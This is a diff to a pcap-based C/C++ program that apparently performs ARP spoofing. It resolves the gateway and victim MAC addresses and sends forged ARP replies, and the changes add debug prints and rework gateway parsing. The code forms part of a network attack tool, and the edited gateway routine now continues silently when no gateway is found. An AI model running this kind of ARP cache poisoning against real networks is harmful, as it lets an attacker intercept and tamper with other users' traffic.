@@ -24,9 +24,10 @@ void usage() {
 
 char myMAC[MAX_STR_SIZE];
 char myIP[MAX_STR_SIZE];
+char gatewayIP[MAX_STR_SIZE];
 
 void getMyAddr(char* dev);
-const char* getGatewayIP();
+void getGatewayIP();
 const char* getMACAddr(char *IP);
 void sendARPRequest(char* dev, const char *gateway);
 void sendARPReply(char* dev, char* sender_IP, char* target_IP);
@@ -46,8 +47,10 @@ int main(int argc, char* argv[]) {
     attackCase = (argc-2)/2;
 
     getMyAddr(argv[1]);
+    getGatewayIP();
 
-    const char* gatewayIP = getGatewayIP();
+    printf("%s %s\n",myIP,myMAC);
+    printf("%s\n",gatewayIP);
 
 
     sendARPRequest(argv[1],gatewayIP);
@@ -98,13 +101,13 @@ void getMyAddr(char* dev)
     }
 }
 
-const char* getGatewayIP()
+void getGatewayIP()
 {
     FILE *fp = NULL;
     char line[MAX_STR_SIZE];
     char* ptr;
 
-    if((fp=popen("route","r"))==NULL)
+    if((fp=popen("route -n","r"))==NULL)
     {
        fprintf(stderr,"Failed to open cmd");
        exit(1);
@@ -112,17 +115,14 @@ const char* getGatewayIP()
     while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
     {
        ptr = strtok(line," ");
-       if(!strcmp(ptr,"default"))
+       if(!strcmp(ptr,"0.0.0.0"))
        {
            ptr=strtok(NULL," ");
            pclose(fp);
-           return ptr;
+           strcpy(gatewayIP,ptr);
+           break;
         }
      }
-
-     fprintf(stderr,"We couldn't find Gateway!");
-     exit(1);
-
 }
 
 const char* getMACAddr(char *IP)
@@ -145,9 +145,9 @@ const char* getMACAddr(char *IP)
     while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
     {
 
+        printf("%s\n",line);
         ptr = strtok(line," ");
         ptr = strtok(NULL," ");
-
         if(!strncmp((ptr+1),IP,len))
         {
 
@@ -171,6 +171,7 @@ const char* getMACAddr(char *IP)
 
 void sendARPRequest(char* dev, const char *target_IP)
 {
+    printf("%s %s\n",dev, target_IP);
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
     if (handle == nullptr) {
@@ -180,8 +181,8 @@ void sendARPRequest(char* dev, const char *target_IP)
 
     EthArpPacket packet;
 
-    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");           // broad
     packet.eth_.smac_ = Mac(myMAC);                // me
+    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");           // broad
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -214,10 +215,12 @@ void sendARPReply(char* dev, char* sender_IP, char* target_IP)
     }
 
     EthArpPacket packet;
+
     sendARPRequest(dev,sender_IP);
     const char* sender_MAC = getMACAddr(sender_IP);
-    packet.eth_.dmac_ = Mac(sender_MAC);           // you
+
     packet.eth_.smac_ = Mac(myMAC);                // me
+    packet.eth_.dmac_ = Mac(sender_MAC);           // you
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
